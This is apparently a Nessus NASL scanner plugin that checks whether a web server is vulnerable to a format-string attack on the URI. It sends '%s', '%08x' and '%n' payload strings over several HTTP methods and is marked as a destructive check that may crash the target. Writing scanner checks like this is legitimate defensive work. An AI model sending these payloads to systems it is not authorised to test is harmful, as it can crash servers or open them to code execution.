#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#

if(description)
{
  script_id(15640);
  script_version ("$Revision: 1.3 $");
 
  name["english"] = "Format string on URI";
  script_name(english:name["english"]);
 
 desc["english"] = "
The remote web server seems to be vulnerable to a format string attack
on the URI.
An attacker might use this flaw to make it crash or even execute 
arbitrary code on this host.


Solution : upgrade your software or contact your vendor and inform him
           of this vulnerability

Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Sends an HTTP request with %s as an URI";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK); 
 
 script_copyright(english:"This script is Copyright (C) 2004 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";

 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
include("http_func.inc");
include("global_settings.inc");
include("misc_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

req = http_get(item: strcat("/nessus", rand_str(), ".html"), port: port);

soc = http_open_socket(port);
if (! soc) exit(0);
send(socket: soc, data: req);
r = http_recv(socket: soc);
http_close_socket(soc);

flag = 0; flag2 = 0;
if (egrep(pattern:"[0-9a-fA-F]{8}", string: r))
{
  flag = 1;
  debug_print('Normal answer:\n', r);
}

soc = http_open_socket(port);
if (! soc) exit(0);

foreach method (make_list("GET", "HEAD", "OPTIONS", "TRACE", "MOVE", "INDEX", 
	"MKDIR", "RMDIR", "PUT", "DELETE"))
foreach bad (make_list("%08x", "%s", "%#0123456x%08x%x%s%p%n%d%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%#0123456x%%x%%s%%p%%n%%d%%o%%u%%c%%h%%l%%q%%j%%z%%Z%%t%%i%%e%%g%%f%%a%%C%%S%%08x"))
{
  req2 = http_get(item: "/"+bad, port: port);
  req2 = ereg_replace(string: req2, pattern: "GET", replace: method);
  send(socket: soc, data: req2);
  r = http_recv(socket: soc);
  http_close_socket(soc);
  if (egrep(pattern:"[0-9a-fA-F]{8}", string: r))
  {
    debug_print('Format string:\n', r);
    flag2 ++;
  }
  soc = http_open_socket(port);
  if (! soc)
  {
    security_hole(port);
    exit(0);
  }
}

http_close_socket(soc);

if (http_is_dead(port: port))
{
  security_hole(port);
  exit(0);
}

if (flag2 && ! flag) security_warning(port);
